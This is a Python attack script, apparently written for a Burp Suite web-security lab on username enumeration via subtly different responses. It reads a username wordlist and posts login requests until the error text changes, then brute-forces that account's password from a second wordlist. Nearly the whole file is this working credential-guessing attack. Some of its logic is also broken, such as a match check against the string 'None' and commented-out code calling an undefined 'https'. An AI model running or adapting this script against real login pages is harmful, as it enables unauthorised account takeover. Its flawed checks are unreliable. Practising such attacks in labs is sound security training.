#!/bin/python3


# make sure you have the below libraries for execution. 

import re, requests, burp_session
from pyinputplus import inputURL

url = inputURL(limit=5, timeout=120)

# check string for login keyword.
pattern = re.compile(r"[^\s]*[^login][^\s]/login$")
istherelogin = pattern.match(url)

if istherelogin == 'None':
    exit()

#  get the session key 
session_cookie = burp_session.get_key(url)

# username enumeration

isThereGrepString = {'Found' : [], 'Not Found' : []}
headers = {
    'Cookie' : f'session={session_cookie}'
}

# take the file as input
userfile = open ('/home/kali/Desktop/scripting/burpsuite_automation_scripts/broken authentication/Authentication Labs/Username enumeration via subtly different responses/username.txt', 'r+')
# usernames can be read, now make a request.

# username = 'ao'
# payload = f'username={username}&password=admin'
# response = https.request('POST', url, headers=headers, body=payload)
grep_string = re.compile(r'^(Invalid username or password\s)$')

# if(grep_string.match(str(response.data))):
#     print('hello')
#     isThereGrepString['Not Found'].append(username)

# print(isThereGrepString)

def string_find(pattern, response):
    exist = re.findall(pattern, response.text)
    if len(exist) != 0:
        return True
    else:
        return False

burp_user = ""

for username in enumerate(userfile):
    payload = f"username={username[1][:-1]}&password=admin"
    response = requests.post(url, headers=headers, data=payload, allow_redirects=False)

    was_string_found = string_find("password\.", response)
    if not was_string_found:
        burp_user = username[1][:-1]
        break

print(f'username found : {burp_user}')

userfile.close()
# username found, 
# enumerating password
print("---finding password---")
password_file = open("./passwords.txt",'r')

burp_pass = ""

for password in enumerate(password_file):
    payload=f'username={burp_user}&password={password[1][:-1]}'
    response2 = requests.post(url, data=payload, allow_redirects=False)
    if(response2.status_code != 200):
        burp_pass = password[1][:-1]
        break

print(f"found password : {burp_pass}")   
password_file.close()
